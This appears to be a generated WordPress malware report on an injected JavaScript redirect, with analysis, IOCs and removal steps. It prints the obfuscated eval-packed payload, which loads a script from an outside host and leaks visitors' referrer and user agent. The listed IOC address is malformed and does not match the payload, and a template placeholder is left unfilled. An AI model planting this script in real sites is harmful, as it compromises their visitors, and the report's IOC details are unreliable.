---
title: "JavaScript Redirect Injection"
slug: "javascript-redirect-injection"
reportDate: "2026-01-24"
threatType: "Redirect Malware"
severity: "High"
fileHash: "db-malware"
detectedPaths: ["New Text Document (2).txt","New Text Document.txt"]
screenshots: ["/images/wordpress-threats/db-malware_evidence-1.png","/images/wordpress-threats/db-malware_evidence-2.png"]
vtLink: "https://www.virustotal.com/gui/home/upload"
vtScore: "Zero-Day (Unique)"
impact: "The website experiences unauthorized redirects, affecting user trust and potentially damaging SEO due to the malicious redirection. Site performance may degrade, and the site could be flagged as malicious."
seenOn: "JavaScript files within WordPress or injected directly into the database"
behavior: "Redirects users to an external domain"
difficulty: "Moderate"
recurrence: "Medium"
numberOfSiteFixed: "Include this if the user mentions how many sites they fixed this malware on"
---

## Technical Analysis
The malicious code is injected into the site, using obfuscated JavaScript to execute a redirect. It targets the user agent and navigator data to construct a URL, leading to a potentially malicious domain 'http://45.67.97/'. The script masquerades as `wpinfo-pst1`, suggesting it might be hidden in WordPress files or theme scripts. The user notes also mention a redirection script in a database spam table, indicating possible database injection.

> **VirusTotal Analysis:** 🛡️ **Zero-Day / Fully Undetected.**

## Attack Chain
1. Identify the obfuscated JavaScript within a WordPress theme or plugin file.
2. Script executes, writing a URL to the document using `document.write`.
3. Redirects users to an external malicious domain.

## Code Signature(s)

### FILE: `New Text Document (2).txt`
```txt
<noindex><script id="wpinfo-pst1" type="text/javascript" rel="nofollow">eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\b'+e(c)+'\b','g'),k[c])}}return p}('0.6("<a g=\'2\' c=\'d\' e=\'b/2\' 4=\'7://5.8.9.f/1/h.s.t?r="+3(0.p)+"\o="+3(j.i)+"\'><\/k"+"l>");n m="q";',30,30,'document||javascript|encodeURI|src||write|http|45|67|script|text|rel|nofollow|type|97|language|jquery|userAgent|navigator|sc|ript|zasti|var|u0026u|referrer|fsikh||js|php'.split('|'),0,{}))
</script></noindex> 
```


### FILE: `New Text Document.txt`
```txt
redirection script in db, i found it in spam table
```


## Indicators of Compromise (IOCs)
- `http://45.67.97/`
- `wpinfo-pst1`
- `javascript`
- `script`

## Removal Protocol
1. Search all theme and plugin files for the obfuscated script pattern beginning with 'eval(function(p,a,c,k,e,d)' and identify its location.
1. Check the database for any tables related to spam where the script may be stored.
1. Remove all instances of the script from files and database, and update WordPress to the latest version.

> **Status:** Active Threat.  
> **Verification:** Verified by MD Pabel.
